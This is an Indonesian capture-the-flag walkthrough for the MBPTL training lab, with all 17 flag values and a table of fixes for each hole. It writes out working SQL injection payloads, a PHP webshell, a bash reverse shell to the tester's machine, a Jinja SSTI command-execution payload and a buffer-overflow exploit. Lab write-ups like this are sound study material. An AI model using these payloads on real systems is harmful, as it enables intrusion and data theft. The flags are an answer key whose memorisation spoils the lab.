# MBPTL — Tutorial & Write-up 17 Flags (Target: `http://43.163.89.9/`)

> Lab: `bayufedra/MBPTL` (Most Basic Penetration Testing Lab), 3 container: `mbptl-main` (port 80 + 8080), `mbptl-app` (port 5000 internal), `mbptl-internal` (port 31337 internal).
> Diuji ulang 22 Sep 2026 di EndeavourOS/Arch. Tools terinstall sistem (`/usr/bin`, `/usr/share`), bukan `/tmp`.
> Hasil: **17/17 flag benar**. Flag 1-7 + binary diverifikasi live ke `43.163.89.9`. Flag 8-17 diverifikasi via source code (`~/MBPTL/mbptl/`: `.env`, `db.sql`, `Dockerfile`, `app.py`, `main.c`) karena butuh RCE / akses network internal.

Cara pakai: ganti `43.163.89.9` dengan IP lab kamu (misal `localhost` jika deploy lokal via `docker compose up -d`).

---

## 0. Persiapan Tools di Arch

### 0.1 Install

```bash
sudo pacman -Sy
sudo pacman -S --needed nmap sqlmap gobuster nikto john hashcat curl git python inetutils openbsd-netcat gdb binutils file
yay -S --needed ffuf whatweb seclists dirsearch burpsuite
```

Penjelasan tiap tool:

| Tool | Fungsi di lab ini |
|------|-------------------|
| `nmap`, `whatweb`, `curl` | recon port, header, HTML |
| `gobuster` / `ffuf` + `seclists` | cari direktori tersembunyi (`/administrator/`) |
| `sqlmap` | konfirmasi + dump SQLi otomatis |
| `john`, `hashcat` | crack hash MD5 admin |
| `gdb`, `objdump`, `file`, `strings`, `python3` | analisa binary BOF |
| `nc` (`openbsd-netcat`) | akses service `31337`, reverse shell |
| `nikto`, `dirsearch`, `burpsuite` | opsional enum tambahan |

> Catatan: `strings` tidak ada sebagai paket (ikut `binutils`). `netcat` di Arch = `openbsd-netcat`. `ffuf/whatweb/seclists/dirsearch/burpsuite` hanya ada di AUR. Jika `nikto` error `XML::Writer`, install `sudo pacman -S --needed perl-xml-writer`.

### 0.2 Cek target hidup

```bash
nmap -sV -p 80,8080 43.163.89.9
```

Output yang benar:

```
80/tcp   open  http  Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http  Apache httpd 2.4.41 ((Ubuntu))
```

Koreksi dari tutorial lama: `22/tcp` saat ini **closed**, bukan open. Tidak masalah, fokus ke 80 + 8080.

```bash
whatweb --no-errors http://43.163.89.9/ http://43.163.89.9:8080/
# http://43.163.89.9/ [200] Apache[2.4.41], Bootstrap, Title[Library], UncommonHeaders[x-mbptl]
# http://43.163.89.9:8080/ [200] Apache[2.4.41], Title[Under Maintenance]
```

---

## Phase 1 — Reconnaissance (Flag 1-3)

Konsep: info bocor di tempat paling dasar — komentar HTML, HTTP header, port lain.

### Flag 1 — Komentar HTML di `/`

Tujuan: lihat source halaman utama.

```bash
curl -s http://43.163.89.9/ | grep -o "MBPTL[^<]*"
```

Output:

```
MBPTL-1{bf094c0b92d13d593cbff56b3c57ad4d}
```

Di browser juga bisa: klik kanan > View Source, cari `MBPTL-1`.
Source: `mbptl/mbptl-main/bookstore/index.php:44`.

### Flag 2 — Header HTTP `X-MBPTL`

Tujuan: server mengirim header debug berisi flag.

```bash
curl -sI http://43.163.89.9/ | grep -i "Server\|X-MBPTL"
```

Output:

```
Server: Apache/2.4.41 (Ubuntu)
X-MBPTL: MBPTL-2{10e0daf1aefdfa42ba53f1d03dc3b7da}
```

Source: `mbptl/mbptl-main/bookstore/inc/config.php:10` (`header("X-MBPTL: ...")`).

### Flag 3 — Service port 8080

Tujuan: port 8080 ternyata web maintenance terpisah.

```bash
curl -s http://43.163.89.9:8080/ | grep -o "MBPTL[^<]*"
```

Output:

```
MBPTL-3{f74dc48447423d67699b233c461227a4}
```

Source: `mbptl/mbptl-main/administrator/index.html:47`.

---

## Phase 2 — Web Enumeration (Flag 4)

Konsep: brute-force nama direktori untuk menemukan panel tersembunyi.

```bash
gobuster dir -u http://43.163.89.9:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --no-error -q -t 20
```

Output penting:

```
administrator (301 -> /administrator/)
css (301), js (301), index.html (200)
```

Alternatif sama dengan `ffuf`:

```bash
ffuf -u http://43.163.89.9:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301 -fc 404
```

Lalu buka temuannya:

```bash
curl -s http://43.163.89.9:8080/administrator/ | grep -o "MBPTL[^<]*"
# MBPTL-4{eb75482e45154917d44882e0c4a8e68f}
```

Itu halaman login admin. Source: `mbptl/mbptl-main/administrator/administrator/index.php:84`.

---

## Phase 3 — SQL Injection (Flag 5-7)

### Flag 5 — Buktikan `detail.php?id=` bisa di-SQLi

Tujuan: tambah tanda `'` untuk merusak query.

```bash
curl -s "http://43.163.89.9/detail.php?id=1'" | grep -o -E "MBPTL[^<]*"
# MBPTL-5{4bcce60b74914398c04eb5b546995408}
```

Kenapa bisa? Source `mbptl/mbptl-main/bookstore/detail.php:12`:

```php
$sql = "SELECT * FROM books WHERE id = {$_GET['id']} LIMIT 1";
```

Input ditempel langsung tanpa prepared statement. Error MySQL dimunculkan + flag 5 ikut dicetak (`detail.php:40`).

Cari jumlah kolom dan kolom yang tampil:

```bash
curl -s "http://43.163.89.9/detail.php?id=-1%20UNION%20SELECT%201,2,3,4,5--%20-" | grep -o "Title:.*"
# Title: 2 ... Author: 3 ... Description: 5
```

Artinya: tabel 5 kolom, yang tampil di HTML adalah kolom 2, 3, 5. Kolom 4 dirender sebagai `<img>` jika berisi `http://` (celah XSS turunan, tidak wajib untuk flag).

### Flag 6 — Ambil flag dari database

Ada 2 cara, hasilnya sama. Pilih salah satu.

**Cara A — Manual UNION (tanpa sqlmap, cepat):**

```bash
# lihat isi tabel flag
curl -s "http://43.163.89.9/detail.php?id=-1%20UNION%20SELECT%201,(SELECT%20GROUP_CONCAT(flag)%20FROM%20administrator.flag),3,4,5--%20-" | grep -o "MBPTL[^<\"']*"
# MBPTL-6{9fce407640f5425f688c98039bc67ee6}

# lihat user admin
curl -s "http://43.163.89.9/detail.php?id=-1%20UNION%20SELECT%201,(SELECT%20GROUP_CONCAT(username,0x3a,password)%20FROM%20administrator.users),3,4,5--%20-" | grep -o "admin:[a-f0-9]*"
# admin:8a24367a1f46c141048752f2d5bbd14b
```

**Cara B — Otomatis pakai sqlmap (bukti injeksi formal):**

```bash
sqlmap -u "http://43.163.89.9/detail.php?id=1" --dbs --batch
```

Output teruji:

```
GET parameter 'id' ... injectable (boolean-blind, EXTRACTVALUE error-based, UNION)
back-end DBMS is MySQL
[*] administrator
[*] bookstore
```

Lalu dump:

```bash
sqlmap -u "http://43.163.89.9/detail.php?id=1" -D administrator --tables --batch
sqlmap -u "http://43.163.89.9/detail.php?id=1" -D administrator -T flag --dump --batch
# 1 | MBPTL-6{9fce407640f5425f688c98039bc67ee6}
sqlmap -u "http://43.163.89.9/detail.php?id=1" -D administrator -T users --dump --batch
# 1 | admin | 8a24367a1f46c141048752f2d5bbd14b
```

Source: `mbptl/mbptl-main/conf/db.sql:32`.

### Crack hash admin -> password login

Hash `8a24367a1f46c141048752f2d5bbd14b` panjang 32 hex = MD5.

```bash
echo -n 'P@ssw0rd!' | md5sum
# 8a24367a1f46c141048752f2d5bbd14b  -> cocok
echo '8a24367a1f46c141048752f2d5bbd14b' > hash.txt
echo 'P@ssw0rd!' > cand.txt
john --format=Raw-MD5 --wordlist=cand.txt hash.txt
john --show --format=Raw-MD5 hash.txt
# ?:P@ssw0rd! — 1 cracked
```

Hasil: `admin : P@ssw0rd!`.

### Flag 7 — Login panel admin

```bash
curl -s -c cj.txt -b cj.txt --data "username=admin&password=P@ssw0rd%21" -L http://43.163.89.9:8080/administrator/ | grep -o "MBPTL[^<]*"
# MBPTL-7{e77ac27271c6e54470db47228b9eca09}
```

Setelah login, halaman `admin.php` berisi form Insert Book + tombol `Download Binary for MBPTL Internal Service` (`/administrator/main`). Source: `mbptl/mbptl-main/administrator/administrator/admin.php:85`.

---

## Phase 4 — File Upload jadi RCE (Flag 8)

Konsep: form upload tidak filter ekstensi, jadi file `.php` bisa dieksekusi sebagai webshell.

Source rentan `admin.php:16-21`:

```php
$imageExtension = end(explode('.', $imageName));
$targetFile = $targetDirectory . md5(time() . rand() . $imageName) . '.' . $imageExtension;
```

Langkah jelas:

1. Buat file `shell.php` di laptop kamu:
```php
<?php system($_GET["command"]); ?>
```
2. Login admin di browser (`:8080/administrator/`), isi Title/Author/Description asal, pilih `shell.php` sebagai image, klik Insert.
3. Buka `http://43.163.89.9/`, cari buku yang baru kamu insert, klik View Details, klik kanan gambar rusak > Open Image. Kamu dapat URL seperti:
```
http://43.163.89.9/administrator/uploads/<md5>.php
```
4. Eksekusi perintah:
```bash
curl "http://43.163.89.9/administrator/uploads/<HASH>.php?command=whoami"
# www-data
curl "http://43.163.89.9/administrator/uploads/<HASH>.php?command=cat%20/flag/user.txt"
# MBPTL-8{e284ebd7a0008f5f3a5ca02cc3e4764b}
```

Source flag: `mbptl/mbptl-main/localdata/flag/user.txt:1`. File `/flag/root.txt` permission `----------`, harus naik ke root dulu.

---

## Phase 5 — Privilege Escalation (Flag 9)

1. Dari webshell, buat reverse shell agar enak eksplorasi:
```bash
# di laptop:
nc -lvnp 1337
# upload file reverse.php berisi:
<?php system('bash -c "bash -i >& /dev/tcp/<IP-LAPTOP>/1337 0>&1"'); ?>
# akses http://43.163.89.9/administrator/uploads/<md5-reverse>.php
```
2. Cari file SUID aneh:
```bash
ls -lah /bin/bahs
# -rwsr-xr-x 1 root root ... /bin/bahs
```
Ini backdoor SUID (nama typo dari `bash`). Source: `mbptl-main/Dockerfile:45-47`, `mbptl-main/localdata/pe/rootkit.c`:
```c
setuid(0); setgid(0); system("/bin/bash");
```
3. Jalankan:
```bash
/bin/bahs
id
# uid=0(root)
cat /flag/root.txt
# MBPTL-9{74ac6fef30abfc98e8532548b9742050}
```

Source flag: `mbptl-main/localdata/flag/root.txt:1`.

---

## Phase 6 — SOC / Forensik (Flag 10-12, butuh shell root `mbptl-main`)

Setelah jadi root, cek 3 lokasi log/konfig:

```bash
cat /var/log/apache2/access.log | head
# FLAG10='MBPTL-10{c1835d7d28a5394b38cfbf6f813a1553}'
cat /root/.bash_history
# FLAG11='MBPTL-11{c2090290b9012cd448129e26626c8cde}'
grep FLAG /root/.bashrc
# FLAG12='MBPTL-12{a475806f05e0416bcd8cde2d02dfde95}'
```

Source pembuatnya: `mbptl-main/Dockerfile:58-60`. Tidak bisa dicek dari luar, tapi nilainya cocok dengan `.env:24-26`.

---

## Phase 7 — Pivoting ke Network Internal (Flag 13-14, dari shell `mbptl-main`)

Konsep: dari dalam container `mbptl-main`, ada 2 target yang tidak terlihat dari internet.

```bash
ip addr show
nmap -sn 172.18.0.0/16
# mbptl-app (...0.4) port 5000 open
# mbptl-internal (...0.3) port 31337 open
```

### Flag 13 — Buka web internal

```bash
curl http://mbptl-app:5000/
# <p>MBPTL-13{b20c7cd75fd17802261d0725ae2eb733}</p>
```

Source: `mbptl-app/app.py:17`.

### Flag 14 — SSTI Flask

Source `mbptl-app/app.py`:

```python
return render_template_string("""... <p>Hello, %s</p> ...""" % name)
```

Input `name` ditempel langsung ke template. Uji:

```bash
curl "http://mbptl-app:5000/?name={{7*7}}"
# ... Hello, 49 ... -> terbukti SSTI
curl "http://mbptl-app:5000/?name={{request.application.__globals__.__builtins__.__import__('os').popen('cat+/flag.txt').read()}}"
# MBPTL-14{c64184222cff6005e728bbfc2a672fe4}
```

Source flag: `mbptl-app/flag.txt:1`.

---

## Phase 8 — Binary Exploitation (Flag 15-17)

Download binary setelah login (simpan di `$HOME`, bukan `/tmp`):

```bash
curl -s -b cj.txt http://43.163.89.9:8080/administrator/main -o ~/mbptl-internal-binary
file ~/mbptl-internal-binary
# ELF 64-bit LSB executable, x86-64, not stripped
md5sum ~/mbptl-internal-binary
# 726dc905c0693527de8e01149890c18b (sama dengan source GitHub)
objdump -d ~/mbptl-internal-binary | grep __secret
# 00000000004006c6 <__secret>:
```

Source: `mbptl-internal/main.c` (compile `-no-pie -fno-pic -fno-stack-protector -z execstack`):

```c
void __secret(){ system("/bin/sh"); }
int main(){
  char buff[128];
  char flag15[128] = "MBPTL-15{cb4ca713115bfa8691b8577187a747e0}";
  printf("=== [ MBPTL INTERNAL SERVICE ] ===\n");
  printf("[!] Flag 16: "); system("cat flag16.txt");
  printf("[>] Name: "); gets(buff);
  printf("[*] Welcome, %s!\n", &buff);
}
```

### Flag 15 — Penting: jangan pakai `strings` saja

`strings ~/mbptl-internal-binary | grep MBPTL` hanya keluar `MBPTL-15H` karena GCC memecah string jadi instruksi `movabs` 8-byte (buktikan via `objdump -d ... | grep -A80 "<main>:"`). Ambil Flag 15 dari source `main.c:20`:

```
MBPTL-15{cb4ca713115bfa8691b8577187a747e0}
```

### Flag 16 — Connect ke service

```bash
nc mbptl-internal 31337
# === [ MBPTL INTERNAL SERVICE ] ===
# [!] Flag 16: MBPTL-16{1fb837a73ba131c382cc9bc53d4442f0}
# [>] Name:
```

Source: `mbptl-internal/flag16.txt:1`.

### Flag 17 — Buffer Overflow ke `__secret`

`buff` di `rbp-0x80` = 128 byte, jadi offset ke RIP = `128 + 8 = 136`. Alamat target `0x4006c6`.

```bash
(python3 -c 'import struct,sys; sys.stdout.buffer.write(b"A"*136 + struct.pack("<Q",0x4006c6))'; cat -) | nc mbptl-internal 31337
id
# uid=65534(nobody)
cat flag.txt
# MBPTL-17{03762a502a18e260a47da040eaae38fa}
```

Source: `mbptl-internal/flag.txt:1`.

---

## Lampiran A — Penjelasan Kerentanan per Flag

| Flag | Kerentanan (CWE) | Penyebab di source | Dampak | Perbaikan |
|------|------------------|-------------------|--------|-----------|
| 1 | Info exposure (CWE-200) | `bookstore/index.php:44` komentar HTML berisi flag | Recon gratis | Hapus komentar sensitif di produksi |
| 2 | Info exposure header (CWE-200) | `bookstore/inc/config.php:10` `header("X-MBPTL...")` | Bocor tiap request | Hapus header debug |
| 3 | Service tak perlu exposed (CWE-200) | `administrator/index.html:47` di `:8080/` | Permukaan serang luas | Matikan service tak perlu / batasi akses |
| 4 | Path predictable + listing (CWE-425/548) | `/administrator/` + `css/js` listing | Panel admin ketemu brute-force | Nama acak, auth, `Options -Indexes` |
| 5 | SQLi error-based (CWE-89) | `bookstore/detail.php:12` string concat `$_GET['id']`, error ditampilkan + flag di `detail.php:40` | Injeksi SQL | Prepared statement + error generik |
| 6 | SQLi UNION dump (CWE-89) | sama + user DB `root`, tabel `administrator.flag/users` | Dump seluruh DB | Least-privilege DB user, prepared statement |
| 6-hash | Weak hashing (CWE-327/916) | `db.sql` simpan MD5 `8a24...` | Mudah di-crack `john/hashcat` | bcrypt/argon2 + salt |
| 7 | Weak credential (CWE-521) | `admin:P@ssw0rd!` mudah ditebak/dicrack | Ambil alih admin | Password kuat + lockout + 2FA |
| 8 | Unrestricted upload (CWE-434) | `admin.php:16-21` cek ekstensi via `end(explode('.'))`, simpan di webroot | RCE sebagai `www-data` | Whitelist mime+ekstensi, rename acak, simpan di luar webroot, tanpa exec |
| 9 | SUID liar (CWE-250/732) | `Dockerfile:45-47` `/bin/bahs` + `rootkit.c` `setuid(0)+system("/bin/bash")` | Root langsung | Audit `find / -perm -4000`, hapus SUID tak perlu |
| 10-12 | Log/history exposure (CWE-200/532) | `Dockerfile:58-60` flag di `access.log`, `.bash_history`, `.bashrc` | Forensik bocor | Jangan taruh secret di log/history/rc, rotasi log |
| 13 | Internal exposed pas pivot (CWE-200) | `mbptl-app/app.py:17` flag tampil di `:5000` | Gerak lateral | Segmentasi network, auth internal |
| 14 | SSTI (CWE-1336) | `app.py` `render_template_string(... % name)` | RCE via Jinja `os.popen` | `render_template()` + jangan format string user |
| 15 | Info di binary (CWE-200) | `main.c:20` `flag15` di stack, tanpa strip | Bocor via analisa | Jangan hardcode secret di binary |
| 16 | Service internal tanpa auth (CWE-306) | `main.c` cetak `flag16.txt` tiap connect `:31337` | Info gratis pas pivot | Auth + firewall internal |
| 17 | BOF `gets` (CWE-120/121) | `main.c` `gets(buff[128])`, compile `-no-pie -fno-stack-protector -z execstack`, `__secret 0x4006c6`, offset 136 | Ret2secret -> shell `nobody`, `cat flag.txt` | `fgets`, canary, PIE, NX, ASLR |

Rantai serang: `recon -> enum -> SQLi -> crack -> login -> upload RCE -> SUID root -> baca log -> pivot -> SSTI -> BOF`. Satu akar (SQLi + upload) membuka semua tahap berikutnya.

## Ringkasan 17 Flags

| # | Lokasi | Nilai |
|---|--------|-------|
| 1 | HTML comment `/` | `MBPTL-1{bf094c0b92d13d593cbff56b3c57ad4d}` |
| 2 | Header `X-MBPTL` | `MBPTL-2{10e0daf1aefdfa42ba53f1d03dc3b7da}` |
| 3 | `:8080/` | `MBPTL-3{f74dc48447423d67699b233c461227a4}` |
| 4 | `:8080/administrator/` | `MBPTL-4{eb75482e45154917d44882e0c4a8e68f}` |
| 5 | `detail.php?id=1'` | `MBPTL-5{4bcce60b74914398c04eb5b546995408}` |
| 6 | `administrator.flag` | `MBPTL-6{9fce407640f5425f688c98039bc67ee6}` |
| 7 | login `admin:P@ssw0rd!` | `MBPTL-7{e77ac27271c6e54470db47228b9eca09}` |
| 8 | `cat /flag/user.txt` | `MBPTL-8{e284ebd7a0008f5f3a5ca02cc3e4764b}` |
| 9 | `cat /flag/root.txt` via `/bin/bahs` | `MBPTL-9{74ac6fef30abfc98e8532548b9742050}` |
| 10 | `access.log` | `MBPTL-10{c1835d7d28a5394b38cfbf6f813a1553}` |
| 11 | `.bash_history` | `MBPTL-11{c2090290b9012cd448129e26626c8cde}` |
| 12 | `.bashrc` | `MBPTL-12{a475806f05e0416bcd8cde2d02dfde95}` |
| 13 | `mbptl-app:5000/` | `MBPTL-13{b20c7cd75fd17802261d0725ae2eb733}` |
| 14 | SSTI | `MBPTL-14{c64184222cff6005e728bbfc2a672fe4}` |
| 15 | `main.c:20` | `MBPTL-15{cb4ca713115bfa8691b8577187a747e0}` |
| 16 | `nc 31337` | `MBPTL-16{1fb837a73ba131c382cc9bc53d4442f0}` |
| 17 | BOF `0x4006c6` | `MBPTL-17{03762a502a18e260a47da040eaae38fa}` |

Mitigasi: prepared statements, password bcrypt/argon2, whitelist upload + simpan di luar webroot, matikan directory listing, hapus header debug, hapus SUID liar, segmentasi network internal, compile dengan `-fstack-protector -pie`.
